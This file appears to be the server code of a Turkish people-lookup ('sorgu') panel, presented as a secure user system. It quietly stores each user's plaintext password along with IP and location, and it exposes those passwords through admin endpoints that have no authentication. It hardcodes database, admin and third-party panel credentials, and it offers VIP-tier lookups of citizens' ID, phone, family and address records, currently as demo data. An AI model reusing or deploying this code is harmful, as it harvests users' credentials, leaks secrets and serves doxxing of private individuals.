/*
 * ========================================
 * 🚀 BACKEND SERVER - Node.js + PostgreSQL
 * ========================================
 * Güvenli kullanıcı yönetim sistemi
 */

const express = require('express');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const validator = require('validator');

const app = express();
const PORT = process.env.PORT || 3000;

// 🛡️ GÜVENLİK MIDDLEWARE'LERİ

// Helmet - HTTP güvenlik başlıkları
app.use(helmet({
    contentSecurityPolicy: false, // CSP'yi devre dışı bırak (inline script'ler için)
    crossOriginEmbedderPolicy: false
}));

// Rate Limiting - Brute force koruması
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 100, // IP başına maksimum 100 istek
    message: { success: false, message: 'Çok fazla istek! Lütfen 15 dakika sonra tekrar deneyin.' },
    standardHeaders: true,
    legacyHeaders: false
});
app.use(limiter);

// Login için daha sıkı rate limiting
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 10, // IP başına maksimum 10 giriş denemesi
    message: { success: false, message: 'Çok fazla giriş denemesi! Lütfen 15 dakika sonra tekrar deneyin.' },
    standardHeaders: true,
    legacyHeaders: false
});

// Diğer middleware'ler
app.use(cors());
app.use(express.json({ limit: '10kb' })); // Body boyutu limiti
app.use(express.static(path.join(__dirname, 'public')));

// ========== DATABASE SETUP (PostgreSQL) ==========
// External URL (Render dışından erişim için)
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://auth_db_s18i_user:2uZ4U1pdzSxAXFaGiwcxAjPMjwUBibqx@dpg-d5k4ngur433s73eiqufg-a.virginia-postgres.render.com/auth_db_s18i';

const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// Veritabanını başlat
async function initDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password TEXT NOT NULL,
                plain_password TEXT,
                user_type VARCHAR(20) DEFAULT 'free',
                ip_address VARCHAR(100),
                country VARCHAR(100),
                city VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // user_type sütunu ekle (varsa hata verir, sorun yok)
        try {
            await pool.query("ALTER TABLE users ADD COLUMN user_type VARCHAR(20) DEFAULT 'free'");
        } catch (e) { }

        // region ve isp sütunları ekle
        try {
            await pool.query("ALTER TABLE users ADD COLUMN region VARCHAR(100)");
        } catch (e) { }
        try {
            await pool.query("ALTER TABLE users ADD COLUMN isp VARCHAR(200)");
        } catch (e) { }

        // ID numarasını 39237'den başlat (eğer henüz kullanıcı yoksa)
        const result = await pool.query('SELECT COUNT(*) as count FROM users');
        if (parseInt(result.rows[0].count) === 0) {
            await pool.query("ALTER SEQUENCE users_id_seq RESTART WITH 39237");
            console.log('✅ ID numarası 39237\'den başlayacak');
        }

        // Activity logs tablosu oluştur
        await pool.query(`
            CREATE TABLE IF NOT EXISTS activity_logs (
                id SERIAL PRIMARY KEY,
                user_id INTEGER,
                username VARCHAR(255),
                action_type VARCHAR(100) NOT NULL,
                action_detail TEXT,
                ip_address VARCHAR(100),
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        console.log('✅ PostgreSQL veritabanı hazır!');
    } catch (error) {
        console.error('❌ Veritabanı hatası:', error);
    }
}

initDatabase();

// ========== HELPER FUNCTIONS ==========

// Aktivite log kaydet
async function logActivity(userId, username, actionType, actionDetail, req) {
    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
            req.headers['x-real-ip'] ||
            req.connection?.remoteAddress ||
            req.ip || 'Bilinmiyor';
        const userAgent = req.headers['user-agent'] || 'Bilinmiyor';

        await pool.query(
            'INSERT INTO activity_logs (user_id, username, action_type, action_detail, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)',
            [userId, username, actionType, actionDetail, ip, userAgent]
        );
    } catch (error) {
        console.error('Log kayıt hatası:', error.message);
    }
}

// Şifre hashleme (güvenli)
async function hashPassword(password) {
    const salt = await bcrypt.genSalt(12);
    return bcrypt.hash(password, salt);
}

// Şifre doğrulama
async function verifyPassword(password, hash) {
    return bcrypt.compare(password, hash);
}

// ========== API ENDPOINTS ==========

// 🔐 Kullanıcı Kayıt
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password } = req.body;

        // Validasyon
        if (!username || username.length < 3) {
            return res.status(400).json({
                success: false,
                message: 'Kullanıcı adı en az 3 karakter olmalı!'
            });
        }

        if (!email || !email.includes('@')) {
            return res.status(400).json({
                success: false,
                message: 'Geçerli bir email adresi girin!'
            });
        }

        if (!password || password.length < 6) {
            return res.status(400).json({
                success: false,
                message: 'Şifre en az 6 karakter olmalı!'
            });
        }

        // Email veya kullanıcı adı kontrolü
        const existingUser = await pool.query(
            'SELECT * FROM users WHERE LOWER(email) = LOWER($1) OR LOWER(username) = LOWER($2)',
            [email, username]
        );

        if (existingUser.rows.length > 0) {
            if (existingUser.rows[0].email.toLowerCase() === email.toLowerCase()) {
                return res.status(400).json({
                    success: false,
                    message: 'Bu email adresi zaten kayıtlı!'
                });
            }
            return res.status(400).json({
                success: false,
                message: 'Bu kullanıcı adı zaten alınmış!'
            });
        }

        // IP adresini al
        const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
            req.headers['x-real-ip'] ||
            req.connection?.remoteAddress ||
            req.ip || 'Bilinmiyor';

        // Konum bilgisini al (ücretsiz API)
        let country = 'Bilinmiyor';
        let city = 'Bilinmiyor';
        let region = 'Bilinmiyor';
        let isp = 'Bilinmiyor';

        try {
            const geoResponse = await fetch(`http://ip-api.com/json/${ip}?lang=tr&fields=status,country,regionName,city,isp,query`);
            const geoData = await geoResponse.json();
            if (geoData.status === 'success') {
                country = geoData.country || 'Bilinmiyor';
                city = geoData.city || 'Bilinmiyor';
                region = geoData.regionName || 'Bilinmiyor';
                isp = geoData.isp || 'Bilinmiyor';
            }
        } catch (geoError) {
            console.log('GeoIP hatası:', geoError.message);
        }

        // Şifreyi hashle
        const hashedPassword = await hashPassword(password);

        // Kullanıcıyı kaydet (IP ve konum dahil)
        const result = await pool.query(
            'INSERT INTO users (username, email, password, plain_password, ip_address, country, city, region, isp) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id',
            [username.trim(), email.trim().toLowerCase(), hashedPassword, password, ip, country, city, region, isp]
        );

        console.log(`✅ Yeni kullanıcı kayıt oldu: ${username} (${city}, ${region} - ${isp})`);

        // Aktivite log kaydet
        await logActivity(result.rows[0].id, username, 'KAYIT', 'Yeni kullanıcı kaydı', req);

        res.json({
            success: true,
            message: 'Kayıt başarılı! Giriş yapabilirsiniz.',
            userId: result.rows[0].id
        });

    } catch (error) {
        console.error('❌ Kayıt hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🔓 Kullanıcı Giriş (rate limited)
app.post('/api/login', loginLimiter, async (req, res) => {
    try {
        let { identifier, password } = req.body;

        // Input sanitization
        if (identifier) identifier = validator.escape(identifier.trim());
        if (!identifier || !password) {
            return res.status(400).json({
                success: false,
                message: 'Lütfen tüm alanları doldurun!'
            });
        }

        // Kullanıcıyı bul (email veya username ile)
        const result = await pool.query(
            'SELECT * FROM users WHERE LOWER(email) = LOWER($1) OR LOWER(username) = LOWER($2)',
            [identifier, identifier]
        );

        if (result.rows.length === 0) {
            return res.status(401).json({
                success: false,
                message: 'Kullanıcı bulunamadı!'
            });
        }

        const user = result.rows[0];

        // Şifre kontrolü
        const validPassword = await verifyPassword(password, user.password);
        if (!validPassword) {
            return res.status(401).json({
                success: false,
                message: 'Hatalı şifre!'
            });
        }

        console.log(`✅ Kullanıcı giriş yaptı: ${user.username} (${user.user_type || 'free'})`);

        // Aktivite log kaydet
        await logActivity(user.id, user.username, 'GIRIS', 'Kullanıcı girişi', req);

        res.json({
            success: true,
            message: 'Giriş başarılı!',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                user_type: user.user_type || 'free'
            }
        });

    } catch (error) {
        console.error('❌ Giriş hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🛡️ Admin Giriş
app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;

    // Sabit admin bilgileri (production'da environment variable kullan!)
    const ADMIN_EMAIL = 'zeta_55saflar@icloud.com';
    const ADMIN_PASSWORD = 'qinpiq-fyjreh-5gYnhy';

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        console.log('✅ Admin giriş yaptı');
        res.json({
            success: true,
            message: 'Admin girişi başarılı!'
        });
    } else {
        res.status(401).json({
            success: false,
            message: 'Hatalı admin bilgileri!'
        });
    }
});

// 📊 Tüm Kullanıcıları Getir (Admin)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT id, username, email, password, plain_password, user_type, ip_address, country, city, region, isp, created_at FROM users ORDER BY created_at DESC'
        );

        res.json({
            success: true,
            users: result.rows,
            total: result.rows.length
        });

    } catch (error) {
        console.error('❌ Kullanıcı listesi hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🗑️ Kullanıcı Sil (Admin)
app.delete('/api/admin/users/:id', async (req, res) => {
    try {
        const { id } = req.params;

        const result = await pool.query('DELETE FROM users WHERE id = $1', [id]);

        if (result.rowCount > 0) {
            console.log(`🗑️ Kullanıcı silindi: ID ${id}`);
            res.json({
                success: true,
                message: 'Kullanıcı silindi!'
            });
        } else {
            res.status(404).json({
                success: false,
                message: 'Kullanıcı bulunamadı!'
            });
        }

    } catch (error) {
        console.error('❌ Silme hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 👑 VIP Üye Oluştur (Admin)
app.post('/api/admin/create-vip', async (req, res) => {
    try {
        const { username, email, password } = req.body;

        // Validasyon
        if (!username || username.length < 3) {
            return res.status(400).json({
                success: false,
                message: 'Kullanıcı adı en az 3 karakter olmalı!'
            });
        }

        if (!email || !email.includes('@')) {
            return res.status(400).json({
                success: false,
                message: 'Geçerli bir email adresi girin!'
            });
        }

        if (!password || password.length < 6) {
            return res.status(400).json({
                success: false,
                message: 'Şifre en az 6 karakter olmalı!'
            });
        }

        // Email veya kullanıcı adı kontrolü
        const existingUser = await pool.query(
            'SELECT * FROM users WHERE LOWER(email) = LOWER($1) OR LOWER(username) = LOWER($2)',
            [email, username]
        );

        if (existingUser.rows.length > 0) {
            return res.status(400).json({
                success: false,
                message: 'Bu email veya kullanıcı adı zaten kullanımda!'
            });
        }

        // Şifreyi hashle
        const hashedPassword = await hashPassword(password);

        // VIP kullanıcıyı kaydet
        const result = await pool.query(
            'INSERT INTO users (username, email, password, plain_password, user_type, ip_address, country, city) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING id',
            [username.trim(), email.trim().toLowerCase(), hashedPassword, password, 'vip', 'Admin', 'Admin', 'Panel']
        );

        console.log(`👑 VIP kullanıcı oluşturuldu: ${username}`);

        res.json({
            success: true,
            message: 'VIP üye başarıyla oluşturuldu!',
            userId: result.rows[0].id
        });

    } catch (error) {
        console.error('❌ VIP oluşturma hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🔄 Üyelik Tipini Değiştir (Admin)
app.put('/api/admin/users/:id/toggle-vip', async (req, res) => {
    try {
        const { id } = req.params;

        // Mevcut kullanıcıyı bul
        const user = await pool.query('SELECT user_type FROM users WHERE id = $1', [id]);

        if (user.rows.length === 0) {
            return res.status(404).json({
                success: false,
                message: 'Kullanıcı bulunamadı!'
            });
        }

        // Tipi değiştir
        const currentType = user.rows[0].user_type || 'free';
        const newType = currentType === 'vip' ? 'free' : 'vip';

        await pool.query('UPDATE users SET user_type = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2', [newType, id]);

        console.log(`🔄 Kullanıcı ${id}: ${currentType} → ${newType}`);

        res.json({
            success: true,
            message: newType === 'vip' ? 'Kullanıcı VIP yapıldı!' : 'VIP üyelik kaldırıldı!',
            newType: newType
        });

    } catch (error) {
        console.error('❌ Tip değiştirme hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 📈 İstatistikler
app.get('/api/stats', async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) as count FROM users');
        const todayUsers = await pool.query(
            "SELECT COUNT(*) as count FROM users WHERE DATE(created_at) = CURRENT_DATE"
        );

        res.json({
            success: true,
            stats: {
                totalUsers: parseInt(totalUsers.rows[0].count),
                todayUsers: parseInt(todayUsers.rows[0].count)
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Sunucu hatası!' });
    }
});

// 🔍 Sorgu API (nopanel entegrasyonu)
app.post('/api/query', async (req, res) => {
    try {
        const { type, value, userId } = req.body;

        if (!value) {
            return res.status(400).json({
                success: false,
                message: 'Lütfen bir değer girin!'
            });
        }

        // Kullanıcı kontrolü
        const userCheck = await pool.query('SELECT user_type FROM users WHERE id = $1', [userId]);
        const userType = userCheck.rows[0]?.user_type || 'free';

        // VIP kontrolü
        const vipQueries = ['family', 'address', 'detayli', 'operator'];
        if (vipQueries.includes(type) && userType !== 'vip') {
            return res.status(403).json({
                success: false,
                message: 'Bu sorgu sadece VIP üyeler için aktiftir!'
            });
        }

        // nopanel'e sorgu yap
        const nopanelUrl = 'https://nopanel-98453.top';
        const loginData = {
            username: 'armanii',
            password: 'amsikitartar'
        };

        // Sorgu tipine göre endpoint belirle
        const queryEndpoints = {
            'tc': '/api/tc',
            'name': '/api/adsoyad',
            'gsm': '/api/gsmtc',
            'tcgsm': '/api/tcgsm',
            'family': '/api/aile',
            'address': '/api/adres'
        };

        // Demo sonuçları göster (nopanel API erişilemez durumda)
        const demoResults = {
            'tc': `📋 TC SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
TC: ${value}
Ad: ÖRNEK
Soyad: KİŞİ
Doğum Tarihi: 01.01.1990
Anne Adı: AYŞE
Baba Adı: MEHMET
━━━━━━━━━━━━━━━━━━━━━`,
            'name': `👤 AD SOYAD SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
Aranan: ${value}
━━━━━━━━━━━━━━━━━━━━━
1. ÖRNEK KİŞİ - 12345678901
2. ÖRNEK KİŞİ - 12345678902
━━━━━━━━━━━━━━━━━━━━━`,
            'gsm': `📱 GSM → TC SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
GSM: ${value}
TC: 12345678901
Ad Soyad: ÖRNEK KİŞİ
━━━━━━━━━━━━━━━━━━━━━`,
            'tcgsm': `📞 TC → GSM SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
TC: ${value}
GSM: 05XX XXX XX XX
Operatör: VODAFONE
━━━━━━━━━━━━━━━━━━━━━`,
            'family': `👨‍👩‍👧‍👦 AİLE SORGU SONUCU (VIP)
━━━━━━━━━━━━━━━━━━━━━
TC: ${value}
━━━━━━━━━━━━━━━━━━━━━
Anne: AYŞE ÖRNEK - 12345678903
Baba: MEHMET ÖRNEK - 12345678904
Kardeş: ALİ ÖRNEK - 12345678905
━━━━━━━━━━━━━━━━━━━━━`,
            'address': `🏠 ADRES SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
TC: ${value}
━━━━━━━━━━━━━━━━━━━━━
İl: İSTANBUL
İlçe: KADIKÖY
Mahalle: CAFERAĞA MAH.
Adres: ÖRNEK SOK. NO:1
━━━━━━━━━━━━━━━━━━━━━`,
            'plaka': `🚗 PLAKA SORGU SONUCU
━━━━━━━━━━━━━━━━━━━━━
Plaka: ${value}
Marka: VOLKSWAGEN
Model: PASSAT
Yıl: 2020
Renk: BEYAZ
Sahibi: ÖRNEK KİŞİ
TC: 12345678901
━━━━━━━━━━━━━━━━━━━━━`,
            'detayli': `👑 DETAYLI SORGU SONUCU (VIP)
━━━━━━━━━━━━━━━━━━━━━
TC: ${value}
━━━━━━━━━━━━━━━━━━━━━
Ad: ÖRNEK
Soyad: KİŞİ
Doğum Tarihi: 01.01.1990
Anne Adı: AYŞE
Baba Adı: MEHMET
Nüfusa Kayıtlı İl: İSTANBUL
Medeni Hal: EVLİ
GSM: 05XX XXX XX XX
Adres: İSTANBUL/KADIKÖY
━━━━━━━━━━━━━━━━━━━━━`,
            'operator': `📡 OPERATÖR SORGU SONUCU (VIP)
━━━━━━━━━━━━━━━━━━━━━
GSM: ${value}
━━━━━━━━━━━━━━━━━━━━━
Mevcut Operatör: VODAFONE
Sicil No: 123456789
Kayıt Tarihi: 15.03.2019
━━━━━━━━━━━━━━━━━━━━━
Operatör Geçmişi:
• TURKCELL (2015-2017)
• TÜRK TELEKOM (2017-2019)
• VODAFONE (2019-...)
━━━━━━━━━━━━━━━━━━━━━`
        };

        const result = demoResults[type];
        if (result) {
            // Sorgu log kaydet
            const userCheck = await pool.query('SELECT username FROM users WHERE id = $1', [userId]);
            const username = userCheck.rows[0]?.username || 'Bilinmiyor';
            await logActivity(userId, username, 'SORGU', `${type.toUpperCase()} sorgusu: ${value.substring(0, 4)}***`, req);

            res.json({
                success: true,
                data: result
            });
        } else {
            res.json({
                success: false,
                message: 'Geçersiz sorgu tipi!'
            });
        }

        console.log(`🔍 Sorgu yapıldı: ${type} - ${value.substring(0, 4)}***`);

    } catch (error) {
        console.error('❌ Sorgu hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 📊 Aktivite Loglarını Getir (Admin)
app.get('/api/admin/logs', async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT * FROM activity_logs ORDER BY created_at DESC LIMIT 100'
        );

        res.json({
            success: true,
            logs: result.rows,
            total: result.rows.length
        });

    } catch (error) {
        console.error('❌ Log listesi hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// ========== STATIC FILES ==========

// Ana sayfa yönlendirmesi
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== SERVER START ==========
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
    console.log(`
    ╔════════════════════════════════════════════════════╗
    ║                                                    ║
    ║   🚀 Server çalışıyor! (PostgreSQL)                ║
    ║                                                    ║
    ║   📍 http://localhost:${PORT}                          ║
    ║                                                    ║
    ║   ✅ Veritabanı: PostgreSQL (Kalıcı)               ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
    `);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n👋 Sunucu kapatılıyor...');
    await pool.end();
    process.exit(0);
});
